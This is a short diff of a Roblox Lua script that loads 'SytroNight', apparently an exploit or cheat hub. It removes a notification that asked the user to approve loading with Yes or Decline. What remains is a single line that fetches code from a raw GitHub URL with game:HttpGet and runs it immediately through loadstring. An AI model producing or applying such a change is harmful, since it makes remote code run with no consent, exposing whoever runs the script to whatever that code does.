@@ -1,21 +1,6 @@
 
-local function callback(text)
-    if text == "Yes" then
+ 
         loadstring(game:HttpGet('https://raw.githubusercontent.com/romoneand/2-77283-0-11984-11-2-2/main/NewMain'))() 
 
 
-    elseif text == "Decline" then
-        return
-    end
-end
-local bindableFunction = Instance.new("BindableFunction")
-bindableFunction.OnInvoke = callback
-
-game.StarterGui:SetCore("SendNotification", {
-Title = "Hey!";
-Text = "load SytroNight?";
-Callback = bindableFunction;
-Button1 = "Yes";
-Button2 = "Decline";
-Duration = math.huge;
-}) 
+     
